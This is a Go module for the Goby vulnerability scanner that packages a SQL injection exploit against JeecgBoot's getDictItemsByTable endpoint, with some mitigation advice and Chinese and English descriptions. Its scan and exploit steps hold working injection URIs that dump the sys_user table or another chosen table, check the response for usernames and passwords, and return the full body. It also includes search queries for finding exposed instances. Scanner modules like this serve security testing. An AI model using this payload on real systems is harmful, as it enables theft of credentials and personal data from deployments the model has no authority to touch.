package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "jeecgboot getDictItemsByTable sql injection",
    "Description": "<p>JeecgBoot is a low code development platform based on code generator.</p><p>JeecgBoot v3.0.0 and earlier versions has SQL injection vulnerability, which can be used by attackers to execute illegal SQL commands and steal database sensitive data.</p>",
    "Product": "Jeecg-Boot",
    "Homepage": "https://github.com/jeecgboot/jeecg-boot",
    "DisclosureDate": "2022-08-31",
    "Author": "蜡笔小新",
    "FofaQuery": "title=\"Jeecg-Boot\" || title=\"JeecgBoot\" || body=\"jeecg-boot\"",
    "GobyQuery": "title=\"Jeecg-Boot\" || title=\"JeecgBoot\" || body=\"jeecg-boot\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Table",
            "type": "select",
            "value": "sys_user, jeecg_order_customer",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": " as \\\"label\\\",x.js as \\\"value\\\" from",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20{{{Table}}}/*,%20'/x.js",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": " as \\\"label\\\",x.js as \\\"value\\\" from ",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "jeecgboot getDictItemsByTable sql 注入漏洞",
            "Product": "Jeecg-Boot",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">JeecgBoot 是一款基于代码生成器的低代码开发平台。</span><br></p><p>JeecgBoot v3.0.0 及之前版本存在SQL注入漏洞，攻击者可利用该漏洞执行非法SQL命令窃取数据库敏感数据。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "jeecgboot getDictItemsByTable sql injection",
            "Product": "Jeecg-Boot",
            "Description": "<p>JeecgBoot is a low code development platform based on code generator.</p><p>JeecgBoot v3.0.0 and earlier versions has SQL injection vulnerability, which can be used by attackers to execute illegal SQL commands and steal database sensitive data.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10701"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}